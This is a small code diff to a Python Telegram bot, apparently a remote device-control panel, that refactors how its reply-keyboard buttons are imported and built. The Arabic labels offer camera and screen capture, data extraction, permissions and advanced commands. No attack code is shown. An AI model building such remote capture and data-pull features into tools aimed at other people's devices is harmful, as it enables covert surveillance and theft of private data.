@@ -22,7 +22,7 @@ from datetime import datetime, timedelta, timezone
 from flask import Flask, jsonify, make_response, request, Response
 from flask_socketio import SocketIO, emit, disconnect
 import telebot
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -1037,18 +1037,18 @@ class MDMBot:
             dashboard_text = _format_dashboard(stats, devs)
 
             # ⚡ إرسال Reply Keyboard في رسالة منفصلة (مهم!)
-            reply_kb = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+            reply_kb = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
             reply_kb.add(
-                telebot.types.KeyboardButton("🎮 لوحة التحكم"),
-                telebot.types.KeyboardButton("🔓 الأذونات")
+                KeyboardButton("🎮 لوحة التحكم"),
+                KeyboardButton("🔓 الأذونات")
             )
             reply_kb.add(
-                telebot.types.KeyboardButton("📷 كاميرا وشاشة"),
-                telebot.types.KeyboardButton("📦 سحب بيانات")
+                KeyboardButton("📷 كاميرا وشاشة"),
+                KeyboardButton("📦 سحب بيانات")
             )
             reply_kb.add(
-                telebot.types.KeyboardButton("⚡ أوامر متقدمة"),
-                telebot.types.KeyboardButton("ℹ️ معلومات")
+                KeyboardButton("⚡ أوامر متقدمة"),
+                KeyboardButton("ℹ️ معلومات")
             )
             # ⚡ إرسال Reply Keyboard أولاً في رسالة منفصلة
             bot.send_message(m.chat.id, "📱 <b>أزرار التحكم السريع</b>\nاستخدم الأزرار أدناه:", parse_mode="HTML", reply_markup=reply_kb)
